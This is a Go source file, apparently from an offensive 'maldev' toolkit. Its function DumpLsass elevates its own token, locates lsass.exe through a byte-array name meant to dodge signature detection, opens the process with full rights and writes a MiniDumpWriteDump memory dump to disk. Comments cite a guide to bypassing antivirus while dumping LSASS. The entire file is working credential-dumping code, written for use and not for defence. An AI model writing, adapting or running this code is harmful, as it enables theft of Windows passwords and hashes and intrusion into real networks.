package core

/*

References:
https://github.com/calebsargent/GoProcDump
https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass

*/

import (
	"os"
	"syscall"
	"unsafe"

	mproc "github.com/D3Ext/maldev/process"
)

func DumpLsass(output string) error {
	err := ElevateProcessToken()
	if err != nil {
		return err
	}

	all_lsass_pids, err := mproc.FindPidByName(string([]byte{'l', 's', 'a', 's', 's', '.', 'e', 'x', 'e'}))
	if err != nil {
		return err
	}
	lsass_pid := all_lsass_pids[0]

	//set up Win32 APIs
	var dbghelp = syscall.NewLazyDLL("Dbghelp.dll")
	var MiniDumpWriteDump = dbghelp.NewProc("MiniDumpWriteDump")
	var kernel32 = syscall.NewLazyDLL("kernel32.dll")
	var OpenProcess = kernel32.NewProc("OpenProcess")
	var CreateFileW = kernel32.NewProc("CreateFileW")

	// error not handle because it's unstable
	processHandle, _, _ := OpenProcess.Call(
		uintptr(0xFFFF),
		uintptr(1),
		uintptr(lsass_pid),
	)

	// Create memory dump
	os.Create(output)

	path, _ := syscall.UTF16PtrFromString(output)
	fileHandle, _, _ := CreateFileW.Call(
		uintptr(unsafe.Pointer(path)),
		syscall.GENERIC_WRITE,
		syscall.FILE_SHARE_READ|syscall.FILE_SHARE_WRITE,
		0,
		syscall.OPEN_EXISTING,
		syscall.FILE_ATTRIBUTE_NORMAL,
		0,
	)

	ret, _, err := MiniDumpWriteDump.Call(
		uintptr(processHandle),
		uintptr(lsass_pid),
		uintptr(fileHandle),
		0x00061907,
		0,
		0,
		0,
	)

	if ret == 0 {
		os.Remove(output)
		return err
	}

	return nil
}
